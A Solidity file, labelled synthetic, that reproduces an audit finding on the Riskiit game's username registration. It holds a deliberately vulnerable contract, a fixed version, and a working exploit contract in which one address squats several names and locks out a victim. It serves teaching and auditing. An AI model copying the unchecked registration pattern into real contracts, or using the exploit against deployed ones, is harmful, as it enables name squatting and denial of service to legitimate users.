// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Ludex Labs Riskiit — unrestricted username registration (Cantina, finding 52922)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: registerPlayer stores ownerOf[username] = msg.sender and never
    records that this sender already registered. One address can take every
    free name, and the legitimate user is locked out of "alice". isOldEnough
    is an unchecked bool. Vulnerable line preserved below (@> VULN). */

contract Riskiit {
    mapping(string => address) public ownerOf;
    mapping(address => uint256) public registrationCount;
    bool public lastAgeFlag;

    function registerPlayer(string calldata username, bool isOldEnough, bytes calldata) external {
        require(bytes(username).length != 0, "empty");
        require(ownerOf[username] == address(0), "taken");
        lastAgeFlag = isOldEnough;
        ownerOf[username] = msg.sender; // @> VULN: no per-sender cap; one address registers every free name
        registrationCount[msg.sender] += 1;
    }
}

contract RiskiitFixed {
    mapping(string => address) public ownerOf;
    mapping(address => bool) public hasRegistered;

    function registerPlayer(string calldata username, bool isOldEnough, bytes calldata ageSig) external {
        require(isOldEnough, "age");
        require(ageSig.length == 65, "age sig");
        require(!hasRegistered[msg.sender], "one name");
        require(ownerOf[username] == address(0), "taken");
        ownerOf[username] = msg.sender;
        hasRegistered[msg.sender] = true;
    }
}

contract Victim {
    bool public blocked;

    function tryRegister(Riskiit riskiit, string calldata username) external returns (bool ok) {
        try riskiit.registerPlayer(username, true, "") {
            ok = true;
        } catch {
            blocked = true;
            ok = false;
        }
    }
}

contract Exploit {
    Riskiit public riskiit; // CREATE nonce 1
    Victim public victim; // CREATE nonce 2

    constructor() {
        riskiit = new Riskiit();
        victim = new Victim();
    }

    function run() external {
        riskiit.registerPlayer("alice", true, "");
        riskiit.registerPlayer("bob", true, "");
        riskiit.registerPlayer("charlie", false, "");
        bool aliceOk = victim.tryRegister(riskiit, "alice");
        require(riskiit.registrationCount(address(this)) == 3, "sybil");
        require(riskiit.ownerOf("alice") == address(this), "alice");
        require(riskiit.ownerOf("bob") == address(this), "bob");
        require(riskiit.ownerOf("charlie") == address(this), "charlie");
        require(!aliceOk && victim.blocked(), "victim not blocked");
    }
}
